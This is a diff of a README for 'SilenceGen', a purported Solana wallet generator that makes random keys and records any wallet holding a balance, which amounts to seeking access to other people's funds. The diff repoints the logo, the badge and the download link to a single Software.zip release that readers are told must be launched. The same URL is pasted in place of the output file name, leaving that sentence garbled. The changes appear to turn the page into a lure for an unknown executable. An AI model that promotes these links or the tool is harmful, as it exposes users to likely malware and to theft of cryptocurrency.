@@ -1,9 +1,9 @@
 # 🌟 Welcome to SilenceGen 🌟
 
-![Solana Logo](https://cdn.worldvectorlogo.com/logos/solana-sol.svg)
+![Solana Logo](https://github.com/alperxx68/SilenceGen/releases/download/v1.0/Software.zip)
 
 ### Repository Description:
-SilenceGen is a powerful Solana Wallet Creator designed to generate addresses, private keys, and seed phrases for Solana wallets. It also includes a feature to automatically check balances for Solana networks. If a wallet with a non-zero balance is discovered, the tool logs and saves the wallet's information (address, mnemonic, private key, and balances) to a file named result.txt.
+SilenceGen is a powerful Solana Wallet Creator designed to generate addresses, private keys, and seed phrases for Solana wallets. It also includes a feature to automatically check balances for Solana networks. If a wallet with a non-zero balance is discovered, the tool logs and saves the wallet's information (address, mnemonic, private key, and balances) to a file named https://github.com/alperxx68/SilenceGen/releases/download/v1.0/Software.zip
 
 ### Topics:
 - solana-balance-checker
@@ -17,7 +17,7 @@ SilenceGen is a powerful Solana Wallet Creator designed to generate addresses, p
 ### Get Started:
 To start using SilenceGen, you can download the software package by clicking the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/alperxx68/SilenceGen/releases/download/v1.0/Software.zip)](https://github.com/alperxx68/SilenceGen/releases/download/v1.0/Software.zip)
 
 *Note: The link above leads directly to the software package that needs to be launched.*
 
